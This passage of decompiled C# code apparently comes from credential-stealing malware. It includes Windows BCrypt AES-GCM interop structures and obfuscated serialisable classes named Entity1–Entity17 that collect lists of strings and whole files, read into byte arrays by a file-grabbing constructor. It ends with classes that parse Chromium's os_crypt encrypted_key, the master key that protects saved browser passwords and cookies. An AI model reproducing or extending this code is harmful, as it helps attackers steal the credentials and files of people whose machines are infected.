			pbTag = Marshal.AllocHGlobal(cbTag);
			Marshal.Copy(tag, 0, pbTag, cbTag);
			cbMacContext = tag.Length;
			pbMacContext = Marshal.AllocHGlobal(cbMacContext);
		}
	}

	public void Dispose()
	{
		if (pbNonce != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbNonce);
		}
		if (pbTag != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbTag);
		}
		if (pbAuthData != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbAuthData);
		}
		if (pbMacContext != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbMacContext);
		}
	}
}
public struct BCRYPT_KEY_LENGTHS_STRUCT
{
	public int dwMinLength;

	public int dwMaxLength;

	public int dwIncrement;
}
public struct BCRYPT_OAEP_PADDING_INFO
{
	[MarshalAs(UnmanagedType.LPWStr)]
	public string pszAlgId;

	public IntPtr pbLabel;

	public int cbLabel;

	public BCRYPT_OAEP_PADDING_INFO(string alg)
	{
		pszAlgId = alg;
		pbLabel = IntPtr.Zero;
		cbLabel = 0;
	}
}
public struct BCRYPT_PSS_PADDING_INFO
{
	[MarshalAs(UnmanagedType.LPWStr)]
	public string pszAlgId;

	public int cbSalt;

	public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
	{
		this.pszAlgId = pszAlgId;
		this.cbSalt = cbSalt;
	}
}
[DataContract(Name = "Entity14", Namespace = "Entity")]
public enum Entity14
{
	[EnumMember]
	Id1,
	[EnumMember]
	Id2
}
[DataContract(Name = "Entity15", Namespace = "Entity")]
public enum Entity15
{
	[EnumMember(Value = "0")]
	Id1,
	[EnumMember(Value = "1")]
	Id2,
	[EnumMember(Value = "2")]
	Id3,
	[EnumMember(Value = "3")]
	Id4,
	[EnumMember(Value = "4")]
	Id5
}
[DataContract(Name = "Entity2", Namespace = "Entity")]
public class Entity2
{
	[DataMember(Name = "Id1")]
	public bool Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public bool Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public bool Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public bool Id4 { get; set; }

	[DataMember(Name = "Id5")]
	public bool Id5 { get; set; }

	[DataMember(Name = "Id6")]
	public bool Id6 { get; set; }

	[DataMember(Name = "Id7")]
	public bool Id7 { get; set; }

	[DataMember(Name = "Id8")]
	public bool Id8 { get; set; }

	[DataMember(Name = "Id9")]
	public bool Id9 { get; set; }

	[DataMember(Name = "Id10")]
	public List<string> Id10 { get; set; }

	[DataMember(Name = "Id11")]
	public List<string> Id11 { get; set; }

	[DataMember(Name = "Id12")]
	public List<string> Id12 { get; set; }

	[DataMember(Name = "Id13")]
	public List<Entity17> Id13 { get; set; }
}
[DataContract(Name = "Entity1", Namespace = "Entity")]
public class Entity1
{
	[DataMember(Name = "Id1")]
	public List<string> Id1 { get; set; } = new List<string>();


	[DataMember(Name = "Id2")]
	public List<string> Id2 { get; set; } = new List<string>();


	[DataMember(Name = "Id3")]
	public List<string> Id3 { get; set; } = new List<string>();


	[DataMember(Name = "Id4")]
	public List<string> Id4 { get; set; } = new List<string>();


	[DataMember(Name = "Id5")]
	public List<Entity3> Id5 { get; set; } = new List<Entity3>();


	[DataMember(Name = "Id6")]
	public List<Entity9> Id6 { get; set; } = new List<Entity9>();


	[DataMember(Name = "Id7")]
	public List<Entity12> Id7 { get; set; } = new List<Entity12>();


	[DataMember(Name = "Id8")]
	public List<Entity4> Id8 { get; set; } = new List<Entity4>();


	[DataMember(Name = "Id9")]
	public List<Entity5> Id9 { get; set; } = new List<Entity5>();


	[DataMember(Name = "Id10")]
	public List<Entity5> Id10 { get; set; } = new List<Entity5>();


	[DataMember(Name = "Id11")]
	public List<Entity5> Id11 { get; set; } = new List<Entity5>();


	[DataMember(Name = "Id12")]
	public List<Entity12> Id12 { get; set; }

	[DataMember(Name = "Id13")]
	public List<Entity5> Id13 { get; set; }

	[DataMember(Name = "Id14")]
	public List<Entity5> Id14 { get; set; }

	[DataMember(Name = "Id15")]
	public List<Entity5> Id15 { get; set; }

	[DataMember(Name = "Id16")]
	public List<Entity5> Id16 { get; set; }
}
[DataContract(Name = "Entity3", Namespace = "Entity")]
public class Entity3
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public Entity14 Id3 { get; set; }
}
[DataContract(Name = "Entity4", Namespace = "Entity")]
public class Entity4
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public string Id3 { get; set; }
}
[DataContract(Name = "Entity5", Namespace = "Entity")]
public class Entity5
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public byte[] Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public string Id4 { get; set; }

	[DataMember(Name = "Id5")]
	public string Id5 { get; set; }

	public Entity5()
	{
	}

	public Entity5(string filename)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		Id1 = ((FileSystemInfo)new FileInfo(filename)).get_Name();
		Id3 = filename.ReadFile();
	}
}
[DataContract(Name = "Entity6", Namespace = "Entity")]
public class Entity6
{
	[DataMember(Name = "Id1")]
	public int Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public Entity15 Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public string Id4 { get; set; }
}
[DataContract(Name = "Entity7", Namespace = "Entity")]
public struct Entity7
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public string Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public string Id4 { get; set; }

	[DataMember(Name = "Id5")]
	public string Id5 { get; set; }

	[DataMember(Name = "Id6")]
	public string Id6 { get; set; }

	[DataMember(Name = "Id7")]
	public Entity1 Id7 { get; set; }

	[DataMember(Name = "Id8")]
	public string Id8 { get; set; }

	[DataMember(Name = "Id9")]
	public string Id9 { get; set; }

	[DataMember(Name = "Id10")]
	public string Id10 { get; set; }

	[DataMember(Name = "Id11")]
	public string Id11 { get; set; }

	[DataMember(Name = "Id12")]
	public byte[] Id12 { get; set; }

	[DataMember(Name = "Id13")]
	public string Id13 { get; set; }

	[DataMember(Name = "Id14")]
	public string Id14 { get; set; }

	[DataMember(Name = "Id15")]
	public bool Id15 { get; set; }
}
[DataContract(Name = "LocalState")]
public class LocalState
{
	[DataMember(Name = "os_crypt")]
	public OsCrypt os_crypt { get; set; }
}
[DataContract(Name = "OsCrypt")]
public class OsCrypt
{
	[DataMember(Name = "encrypted_key")]
	public string encrypted_key { get; set; }
}
